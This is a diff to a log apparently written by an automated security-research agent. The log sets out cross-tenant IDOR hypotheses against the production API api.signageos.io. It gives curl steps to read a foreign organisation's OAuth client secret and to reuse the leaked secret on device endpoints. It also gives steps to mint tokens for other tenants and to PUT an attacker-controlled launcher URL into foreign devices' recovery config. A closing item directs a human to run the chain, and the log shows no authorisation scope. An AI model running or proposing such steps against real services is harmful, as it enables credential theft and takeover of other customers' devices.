@@ -502,3 +502,32 @@ testability: AUTH_HELPED
 [NEXT] HUMAN: Execute H1 POC exactly as code-verified — 1) `sos login` (Auth0 device-code) mints account JWT; 2) baseline `curl -H "X-Auth: <jwt>" "https://api.signageos.io/v1/organization/<own-org-uid>"` → expect 200 + `oauthClientSecret` (from `sos organization list` for own UID); 3) repeat with a foreign tenant's org UID (second test tenant) → **200 + oauthClientSecret = confirmed CRITICAL cross-tenant credential disclosure**; 4) escalate: `curl -H "X-Auth: <leakedClientId>:<leakedSecret>" "https://api.signageos.io/v1/device"`; then H2 (GET/POST `/v1/organization/<foreign>/security-token`) and H3 (GET/PUT `/v1/device/<foreign-uid>/peer-recovery`). No organizationUid query param anywhere in this recipe.
 [RISK] box.signageos.io: 58 — Auth0-redirect wall on all paths except `/status` (pod hostname + Redis/Mongo/AMQP topology + Node version), `/login/` (CSP 40+ origins, 18-origin static ACAO incl `http://` + `*.zdusercontent.com`), `/ready`. Moderate operational exposure; no data access without credentials.
 [RISK] api.signageos.io: 50 — `/status` info leak same class; every SDK/bundle-derived route (30+ resources, 8 newly probed) is solidly JWT/legacy-X-Auth gated; no CORS/GraphQL surface. Residual exposure is the code-verified AUTH_HELPED cross-tenant org/device IDOR chain against the high-value device/content API — highest-severity finding if the server-side org-membership check on path UIDs is absent.
+## 2026-08-08 00:42:57 UTC [box] (model bigpickle)
+[HYP] Cross-tenant org OAuth client-secret disclosure via account token
+class: IDOR
+asset: api.signageos.io/v1/organization/{organizationUid} (GET)
+confidence: 76
+reasoning: SDK/CLI code-verified — GET with `X-Auth: <JWT>` and NO organizationUid query param; response maps oauthClientId+oauthClientSecret; uid is arbitrary CLI arg; per-path org-membership check is the sole barrier; 403-gate reconfirmed pre-auth today.
+evidence_needed: own account JWT → HTTP 200 (not 403) on GET /v1/organization/<foreign-org-uid> returning oauthClientSecret.
+verify_steps: AUTH_HELPED: baseline `curl -H "X-Auth: <jwt>" https://api.signageos.io/v1/organization/<own-org-uid>` = 200; same on foreign uid → 200+secret = cross-tenant; escalate `curl -H "X-Auth: <clientId>:<leakedSecret>" https://api.signageos.io/v1/device`.
+impact: any tenant's org API credential → full device/content/firmware control of foreign org; CRITICAL
+testability: AUTH_HELPED
+[HYP] Cross-tenant org security-token minting via account token
+class: IDOR
+asset: api.signageos.io/v1/organization/{uid}/security-token (GET/POST)
+confidence: 68
+reasoning: `OrganizationTokenManagement.ts` code-verified — GET list + POST `{"name":...}` with client-supplied UID; path UID + JWT membership check is the only barrier; endpoint 403-gated pre-auth reconfirmed today.
+evidence_needed: own creds → 200 on foreign uid; POST mints token valid on /v1/device.
+verify_steps: AUTH_HELPED: baseline `GET /v1/organization/<own>/security-token` = 200; foreign uid → 200 = cross-tenant mint; POST `{"name":"poc"}` → validate minted token with `X-Auth: <token>` on /v1/device.
+impact: mint org tokens for any tenant → full foreign-device control; CRITICAL
+testability: AUTH_HELPED
+[HYP] Cross-tenant device subresource read/write via client-supplied deviceUid
+class: IDOR
+asset: api.signageos.io/v1/device/{deviceUid}/peer-recovery (GET/PUT)
+confidence: 64
+reasoning: `DevicePeerRecoveryManagement.ts` code-verified — GET/PUT with deviceUid as arbitrary path arg; legacy `X-Auth: clientId:secret` derives org from credential; org→device binding is the only barrier; 403 pre-auth reconfirmed today.
+evidence_needed: own legacy creds → 200 on foreign device uid; PUT writes urlLauncherAddress.
+verify_steps: AUTH_HELPED: baseline `GET /v1/device/<own-uid>/peer-recovery -H "X-Auth: <ownClientId>:<ownSecret>"` = 200; foreign uid → 200 = cross-tenant; PUT `{"enabled":true,"urlLauncherAddress":"https://<attacker>"}` confirms write.
+impact: read/overwrite foreign device recovery-launcher config → device/content takeover; HIGH→CRITICAL
+testability: AUTH_HELPED
+[NEXT] HUMAN: Execute H1 POC exactly as code-verified — 1) `sos login` (Auth0 device-code) to mint account JWT; 2) baseline `curl -H "X-Auth: <jwt>" "https://api.signageos.io/v1/organization/<own-org-uid>"` → expect 200 + oauthClientSecret (get own UID from `sos organization list`); 3) repeat with a foreign tenant's org UID → **200 + oauthClientSecret = confirmed CRITICAL cross-tenant credential disclosure**; 4) escalate with `curl -H "X-Auth: <leakedClientId>:<leakedSecret>" "https://api.signageos.io/v1/device"`; then H2 (GET/POST `/v1/organization/<foreign>/security-token`) and H3 (GET/PUT `/v1/device/<foreign-uid>/peer-recovery`). No organizationUid query param anywhere in this recipe.
